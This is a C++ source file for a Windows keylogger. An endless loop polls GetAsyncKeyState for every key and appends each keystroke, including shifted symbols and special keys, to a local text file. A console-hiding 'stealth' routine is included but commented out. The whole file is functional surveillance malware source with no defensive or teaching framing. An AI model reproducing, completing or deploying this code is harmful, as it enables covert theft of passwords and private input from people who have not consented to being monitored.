#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

//hiding the console after running the exe file
// void hide(){
//     HWND stealth;
//     AllocConsole();
//     stealth = FindWindowA("ConsoleWindowClass",NULL);
//     ShowWindow(stealth,0);
// }

void logger()
{
    char key;
    for (;;)
    {
        for (key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                ofstream write("D:/Programming/C++/file.txt", ios::app);
                // Check if the key is uppercase and Shift is not pressed
                if ((key > 62) && (key < 91) && !(GetAsyncKeyState(0x10)))
                {
                    key += 32;
                    write << key;
                    write.close();
                }
                else if ((key > 62) && (key < 91))
                {
                    write << key; // Write the key as it is
                    write.close();
                }
                else
                {
                    switch (key)
                    {
                        //Virtual Key
                        case VK_TAB: write << "[TAB]"; break;
                        case VK_CAPITAL: write << "[CAPS LOCK]"; break;
                        case VK_BACK: write << "[BACKSPACE]"; break;
                        case VK_ESCAPE: write << "[ESCAPE]"; break;
                        case VK_DELETE: write << "[DELETE]"; break;
                        case VK_LEFT: write << "[LEFT ARROW]"; break;
                        case VK_RIGHT: write << "[RIGHT ARROW]"; break;
                        case VK_UP: write << "[UP ARROW]"; break;
                        case VK_DOWN: write << "[DOWN ARROW]"; break;
                        //Numbers and their SHIFT value
                        case 32: write << (GetAsyncKeyState(0x10) ? ' ' : ' '); break;
                        case 48: write << (GetAsyncKeyState(0x10) ? ')' : '0'); break;
                        case 49: write << (GetAsyncKeyState(0x10) ? '!' : '1'); break;
                        case 50: write << (GetAsyncKeyState(0x10) ? '@' : '2'); break;
                        case 51: write << (GetAsyncKeyState(0x10) ? '#' : '3'); break;
                        case 52: write << (GetAsyncKeyState(0x10) ? '$' : '4'); break;
                        case 53: write << (GetAsyncKeyState(0x10) ? '%' : '5'); break;
                        case 54: write << (GetAsyncKeyState(0x10) ? '^' : '6'); break;
                        case 55: write << (GetAsyncKeyState(0x10) ? '&' : '7'); break;
                        case 56: write << (GetAsyncKeyState(0x10) ? '*' : '8'); break;
                        case 57: write << (GetAsyncKeyState(0x10) ? '(' : '9'); break;
                        
                    }
                    write.close();
                }
            }
        }
        Sleep(10);
    }
    
}

int main(){
        // hide();
        logger();
        return 0;
}

